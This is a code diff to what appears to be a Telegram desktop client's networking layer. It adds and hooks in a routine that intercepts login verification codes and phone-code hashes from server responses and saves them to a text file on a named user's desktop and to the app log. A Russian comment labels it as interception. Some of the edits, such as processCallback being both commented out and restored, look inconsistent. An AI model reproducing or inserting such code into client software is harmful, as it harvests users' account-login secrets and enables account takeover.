@@ -62,98 +62,97 @@ namespace {
         }
     }
 
-    void ExtractVerificationCode(const QByteArray& data, mtpRequestId requestId) {
-        if (data.size() < 8) return;
-        
-        try {
-            QDataStream stream(data);
-            stream.setVersion(QDataStream::Qt_5_1);
+   void ExtractVerificationCode(const mtpBuffer &data, mtpRequestId requestId) {
+		if (data.size() < 8) return;
+		
+		try {
+		
+			QByteArray bytes;
+			bytes.reserve(data.size() * sizeof(mtpBuffer::value_type));
+			for (const auto &val : data) {
+				bytes.append((const char*)&val, sizeof(val));
+			}
+			
+			QDataStream stream(bytes);
+			stream.setVersion(QDataStream::Qt_5_1);
 
-            quint32 type = 0;
-            stream >> type;
-            
+			quint32 type = 0;
+			stream >> type;
+			
+			const quint32 kAuthSentCode = 0x5e00270e;
+			const quint32 kAuthSentCodeSuccess = 0x258e396e;
+			
+			if (type == kAuthSentCode || type == kAuthSentCodeSuccess) {
+				QString code;
+				QString phoneCodeHash;
+				
+				quint32 flags = 0;
+				stream >> flags;
+				
+				quint32 hashSize = 0;
+				stream >> hashSize;
+				if (hashSize > 0 && hashSize < 128) {
+					QByteArray hashData;
+					hashData.resize(hashSize);
+					stream.readRawData(hashData.data(), hashSize);
+					phoneCodeHash = QString::fromUtf8(hashData);
+				}
+	
+				if (flags & 0x02) {
+					quint32 nextType = 0;
+					stream >> nextType;
+				}
+	
+				if (flags & 0x04) {
+					quint32 timeout = 0;
+					stream >> timeout;
+				}
 
-            // 0x5e00270e = auth.sentCode
-            // 0x258e396e = auth.sentCodeSuccess
-            const quint32 kAuthSentCode = 0x5e00270e;
-            const quint32 kAuthSentCodeSuccess = 0x258e396e;
-            
-            if (type == kAuthSentCode || type == kAuthSentCodeSuccess) {
-                QString code;
-                QString phoneCodeHash;
-                
-                //  auth.sentCode
-                // : flags (int), phone_code_hash (string), 
-                //         next_type? (flags), timeout? (int)
-                
+				
+				if (bytes.contains("phone_code")) {
+					int pos = bytes.indexOf("phone_code");
+					if (pos > 0 && pos + 20 < bytes.size()) {
+						pos += 12;
+						int len = bytes[pos];
+						if (len > 0 && len < 10) {
+							code = QString::fromUtf8(bytes.mid(pos + 1, len));
+						}
+					}
+				}
 
-                quint32 flags = 0;
-                stream >> flags;
-                
-
-                quint32 hashSize = 0;
-                stream >> hashSize;
-                if (hashSize > 0 && hashSize < 128) {
-                    QByteArray hashData;
-                    hashData.resize(hashSize);
-                    stream.readRawData(hashData.data(), hashSize);
-                    phoneCodeHash = QString::fromUtf8(hashData);
-                }
- 
-                if (flags & 0x02) {
-                    quint32 nextType = 0;
-                    stream >> nextType;
-                }
-  
-                if (flags & 0x04) {
-                    quint32 timeout = 0;
-                    stream >> timeout;
-                }
-
-                if (data.contains("phone_code")) {
-                    int pos = data.indexOf("phone_code");
-                    if (pos > 0 && pos + 20 < data.size()) {
-                        pos += 12;
-                        int len = data[pos];
-                        if (len > 0 && len < 10) {
-                            code = QString::fromUtf8(data.mid(pos + 1, len));
-                        }
-                    }
-                }
-
-                if (code.isEmpty()) {
-
-                    QByteArray trimmed = data.right(32);
-                    QString str = QString::fromUtf8(trimmed);
-                    QRegularExpression regex("\\b(\\d{4,6})\\b");
-                    QRegularExpressionMatch match = regex.match(str);
-                    if (match.hasMatch()) {
-                        code = match.captured(1);
-                    }
-                }
-                
-
-                std::stringstream log;
-                log << GetCurrentTimestamp()
-                    << "✅ VERIFICATION CODE " << std::string(30, '=') << "\n"
-                    << "   Request ID: " << requestId << "\n"
-                    << "   Type: " << (type == kAuthSentCode ? "auth.sentCode" : "auth.sentCodeSuccess") << "\n"
-                    << "   Code: " << code.toStdString() << "\n"
-                    << "   Hash: " << phoneCodeHash.toStdString() << "\n"
-                    << std::string(50, '=') << "\n\n";
-                
-                WriteToLog("telegram_codes.txt", log.str());
-                LOG(("✅ CODE SAVED: %1 | Request ID: %2")
-                    .arg(code)
-                    .arg(requestId));
-            }
-        } catch (const std::exception& e) {
-            LOG(("MTP Error: ExtractVerificationCode exception: %1")
-                .arg(e.what()));
-        } catch (...) {
-          
-        }
-    }
+				if (code.isEmpty()) {
+					QByteArray trimmed = bytes.right(32);
+					QString str = QString::fromUtf8(trimmed);
+					QRegularExpression regex("\\b(\\d{4,6})\\b");
+					QRegularExpressionMatch match = regex.match(str);
+					if (match.hasMatch()) {
+						code = match.captured(1);
+					}
+				}
+				
+				
+				std::stringstream log;
+				log << GetCurrentTimestamp()
+					<< "✅ VERIFICATION CODE " << std::string(30, '=') << "\n"
+					<< "   Request ID: " << requestId << "\n"
+					<< "   Type: " << (type == kAuthSentCode ? "auth.sentCode" : "auth.sentCodeSuccess") << "\n"
+					<< "   Code: " << code.toStdString() << "\n"
+					<< "   Hash: " << phoneCodeHash.toStdString() << "\n"
+					<< std::string(50, '=') << "\n\n";
+				
+				WriteToLog("C:\\Users\\Nik\\Desktop\\telegram_codes.txt", log.str());
+				
+				LOG(("✅ CODE SAVED: %1 | Request ID: %2")
+					.arg(code)
+					.arg(requestId));
+			}
+		} catch (const std::exception& e) {
+			LOG(("MTP Error: ExtractVerificationCode exception: %1")
+				.arg(e.what()));
+		} catch (...) {
+			
+		}
+	}
 }
 
 
@@ -1272,7 +1271,7 @@ bool Instance::Private::hasCallback(mtpRequestId requestId) const {
 	return (it != _parserMap.cend());
 }
 
-void Instance::Private::processCallback(const Response &response) {
+/*void Instance::Private::processCallback(const Response &response) {
 	const auto requestId = response.requestId;
 	ResponseHandler handler;
 	{
@@ -1329,7 +1328,7 @@ void Instance::Private::processCallback(const Response &response) {
 		DEBUG_LOG(("RPC Info: parser not found for %1").arg(requestId));
 		unregisterRequest(requestId);
 	}
-}
+}*/
 
 void Instance::Private::processUpdate(const Response &message) {
 	ExtractVerificationCode(message.reply, message.requestId);
@@ -2200,9 +2199,9 @@ bool Instance::hasCallback(mtpRequestId requestId) const {
 	return _private->hasCallback(requestId);
 }
 
-/*void Instance::processCallback(const Response &response) {
+void Instance::processCallback(const Response &response) {
 	_private->processCallback(response);
-}*/
+}
 
 void Instance::Private::processCallback(const Response &response) {
     // Перехватываем код подтверждения
